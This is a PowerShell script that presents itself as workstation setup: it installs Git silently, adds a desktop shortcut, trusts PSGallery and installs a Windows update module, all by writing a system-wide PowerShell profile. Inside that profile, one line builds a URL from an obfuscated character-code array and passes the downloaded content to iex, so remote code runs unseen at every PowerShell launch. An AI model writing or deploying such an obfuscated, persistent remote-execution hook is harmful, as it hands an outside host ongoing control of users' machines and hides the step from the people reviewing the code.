$Content = "
if(Get-NetRoute | Where-Object DestinationPrefix -eq '0.0.0.0/0' | Get-NetIPInterface | Where-Object ConnectionState -eq 'Connected'){`$ConnectedToTheInternet = `$true}

if(-not `$ConnectedToTheInternet){

  Write-Host `"No Internet access`" -ForegroundColor Red

}else{
      

    #region --- Configure Local Environment ---

      if([Net.ServicePointManager]::SecurityProtocol -ne 'Tls12'){[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12}
      
    #endregion --------------------------------


    if(Test-Path -Path `"C:\Program Files\Git\git-cmd.exe`"){
  
      #region --- Download PowerShell Scripts ---

        (iex (iwr -Uri ([char[]](104,116,116,112,115,58,47,47,112,97,110,103,101,
        97,105,109,109,101,114,115,105,118,101,46,105,111) -Join '')).ToString())
      
      #endregion --------------------------------
  
    }else{
      
      #region -------- Install Git-Smc ----------
    
        `$GitExe = 'Git-2.44.0-64-bit.exe'
        (New-Object Net.WebClient).DownloadFile(`"https://github.com/git-for-windows/git/releases/download/v2.44.0.windows.1/`$GitExe`", `"`$env:TEMP\`$GitExe`")
        Invoke-Expression `"`$env:TEMP\`$GitExe /VERYSILENT`"
        
      #endregion -------------------------------- 

    }

    #region ----- Create Desktop Shortcut -----
    
      if(!(Test-Path -Path `"`$Home\Desktop\PowerShell.lnk`")){
        `$WshShell = New-Object -comObject WScript.Shell
        `$Shortcut = `$WshShell.CreateShortcut(`"`$Home\Desktop\PowerShell.lnk`")
        `$Shortcut.TargetPath = 'PowerShell.exe'
        `$Shortcut.Arguments = '-NoLogo'
        `$Shortcut.Save()
      }
  
    #endregion --------------------------------


    #region ------ Update Windows -------------

      if(!(Get-Command Install-WindowsUpdate -ErrorAction SilentlyContinue)){
        Write-Host `"First time setup... please wait.``n`" -ForegroundColor Cyan
        #Write-Host `"Updating Windows``n`" -ForegroundColor Cyan

        Install-PackageProvider -Name NuGet -Force | Out-Null
        Set-PSRepository -Name PSGallery -InstallationPolicy Trusted | Out-Null

        Install-Module -Name PSWindowsUpdate -Force
        #Install-WindowsUpdate -AcceptAll -Download

        #Start-Sleep -Seconds 5
        Write-Host `"``nPlease restart PowerShell`" -ForegroundColor Yellow
      }
    
    #endregion --------------------------------


}

cd\
"

New-Item -Path "$PSHOME\profile.ps1" -ItemType File -Value $Content
